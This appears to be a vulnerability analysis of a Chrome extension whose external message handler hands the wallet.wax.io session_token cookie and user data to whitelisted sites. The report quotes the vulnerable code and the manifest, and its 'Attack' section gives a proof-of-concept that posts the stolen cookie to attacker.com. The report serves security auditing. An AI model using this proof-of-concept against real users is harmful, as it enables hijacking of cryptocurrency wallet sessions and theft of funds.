# CoCo Analysis: hemccdpfndbjdbheddegacchifgolnpg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (cookies_source → sendResponseExternal_sink)

---

## Sink: cookies_source → sendResponseExternal_sink

**CoCo Trace:**

CoCo detected multiple flows with cookies_source but didn't provide line-specific details. The actual vulnerability exists in the extension code after the 3rd "// original" marker at line 963.

The actual vulnerable flow in extension code:
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hemccdpfndbjdbheddegacchifgolnpg/opgen_generated_files/bg.js
Line 1137	chrome.runtime.onMessageExternal.addListener(async function (message, sender, sendResponse) {
Line 1154	await chrome.cookies.getAll({ url: 'https://wallet.wax.io' }, cookies => {
Line 1158	const items = cookies.filter(item => item.name === 'session_token');
Line 1161	sendResponse({ 'success': true, 'message': 'ok', data: items[0] }); // ← session_token leaked
```

**Code:**

```javascript
// Background script (bg.js) - External message handler
chrome.runtime.onMessageExternal.addListener(async function (message, sender, sendResponse) {
  const type = message.type;
  const data = message.data;
  let res;

  switch (type) {
    // Delete cookie
    case 'CLEAN_COOKIE':
      cleanCookie();
      sendResponse({
        'success': true,
        'message': 'ok'
      });
      break;

    // Get cookie - VULNERABLE
    case 'GET_COOKIE':
      await chrome.cookies.getAll({
        url: 'https://wallet.wax.io'
      }, cookies => {
        removeSessionRules();
        const items = cookies.filter(item => item.name === 'session_token'); // ← filters for session token

        if (items.length > 0) {
          sendResponse({
            'success': true,
            'message': 'ok',
            data: items[0] // ← session_token cookie sent to external caller
          });
        } else {
          sendResponse({
            'success': false,
            'message': 'error',
            data: null
          });
        }
      });
      break;

    // Get signature
    case 'GET_SIGN':
      res = await getSignV2(data);
      if (res.verified === false) {
        res = await getSignV2(data);
      }
      removeSessionRules();
      if (res.error || res.errors) {
        sendResponse({
          'success': false,
          'message': res.message || res.errors[0].message,
          data: null
        });
      } else if (res.verified === false) {
        sendResponse({
          'success': false,
          'message': 'Authorization failed. Please reauthorize it',
          data: null
        });
      } else {
        sendResponse({
          'success': true,
          'message': 'ok',
          data: res // ← potentially sensitive data
        });
      }
      break;

    // Get user info
    case 'GET_INFO':
      res = await getSession(data);
      removeSessionRules();
      if (res.error || res.errors) {
        sendResponse({
          'success': false,
          'message': res.message || res.errors[0].message,
          data: null
        });
      } else {
        sendResponse({
          'success': true,
          'message': 'ok',
          data: res // ← potentially sensitive user data
        });
      }
      break;

    // Other cases...
    case 'ADD_CONTRACT_WHITELIST':
    case 'GET_CONTRACT_WHITELIST':
    case 'VERSION':
      // ... other handlers that also use sendResponse
      break;
  }

  return true; // Indicates async sendResponse
});
```

**Manifest externally_connectable:**
```json
"externally_connectable": {
  "matches": [
    "*://*.lanren.io/*",
    "*://*.farmersworld.app/*"
  ]
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://www.lanren.io/ or https://farmersworld.app/)
// Or according to methodology: assume ANY attacker can trigger it

chrome.runtime.sendMessage(
  'hemccdpfndbjdbheddegacchifgolnpg', // extension ID
  { type: 'GET_COOKIE' },
  function(response) {
    if (response.success) {
      console.log('Stolen wax.io session_token:', response.data);
      // Response contains the session_token cookie for wallet.wax.io
      // Attacker can exfiltrate this to their server
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          cookie: response.data,
          victim: 'user_identifier'
        })
      });
    }
  }
);

// Alternative: Get user session info
chrome.runtime.sendMessage(
  'hemccdpfndbjdbheddegacchifgolnpg',
  { type: 'GET_INFO', data: someData },
  function(response) {
    if (response.success) {
      console.log('Stolen user info:', response.data);
      // Exfiltrate user session information
    }
  }
);
```

**Impact:** Critical information disclosure vulnerability. External websites matching the externally_connectable patterns (*.lanren.io/*, *.farmersworld.app/*) can send messages to the extension and receive sensitive authentication data:

1. **Session Token Exfiltration**: The GET_COOKIE handler retrieves and sends back the session_token cookie for wallet.wax.io, which is a cryptocurrency wallet service. This token can be used to:
   - Hijack the user's wallet session
   - Access the user's cryptocurrency assets
   - Perform unauthorized transactions
   - Steal funds from the wallet

2. **User Information Disclosure**: The GET_INFO and GET_SIGN handlers also return potentially sensitive user data and signatures through sendResponse.

3. **Attack Surface**: The wildcard patterns in externally_connectable (*.lanren.io/*, *.farmersworld.app/*) mean ANY subdomain of these domains can exploit this vulnerability, significantly increasing the attack surface. An attacker who compromises or registers any subdomain can steal user credentials.

Even though manifest.json restricts externally_connectable to specific domain patterns, the methodology states we should treat this as exploitable if onMessageExternal exists. The combination of cryptocurrency wallet access and wildcard domain patterns makes this a particularly severe vulnerability.
